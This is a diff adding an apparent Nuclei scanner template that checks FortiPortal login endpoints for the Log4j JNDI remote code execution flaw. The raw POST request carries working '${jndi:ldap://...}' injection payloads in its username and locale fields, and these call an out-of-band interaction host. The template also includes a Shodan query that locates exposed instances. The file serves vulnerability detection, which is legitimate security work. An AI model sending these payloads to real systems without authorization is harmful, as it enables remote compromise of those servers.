@@ -1,0 +1,65 @@
+http:
+    - extractors:
+        - kval:
+            - interactsh_ip
+          type: kval
+        - group: 2
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+        - group: 1
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+        - part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          POST /fpc/login/ HTTP/1.1
+          Host: {{Hostname}}
+          Origin: {{RootURL}}
+          Accept: application/json, text/plain, */*
+          Referer: {{RootURL}}/fpc/app/login
+          Content-Type: application/json
+
+          {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}","password":"{{str}}","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
+id: fortiportal-log4j-rce
+info:
+    author: shaikhyaser
+    classification:
+        cve-id: CVE-2021-44228
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        FortiPortal is susceptible to Log4j JNDI remote code execution. FortiPortal provides comprehensive security management and analytics within a multi-tenant, multi-tier management framework.
+    metadata:
+        max-request: 1
+        shodan-query: html:"FortiPortal"
+    name: FortiPortal - Remote Code Execution (Apache Log4j)
+    reference:
+        - https://www.fortiguard.com/psirt/FG-IR-21-245
+    severity: critical
+    tags:
+        - jndi
+        - log4j
+        - fortiportal
+        - oast
+        - kev
+        - fortiguard
+        - FortiPortal
+        - thin
+variables:
+    rand1: '{{rand_int(111, 999)}}'
+    rand2: '{{rand_int(111, 999)}}'
+    str: '{{rand_base(5)}}'
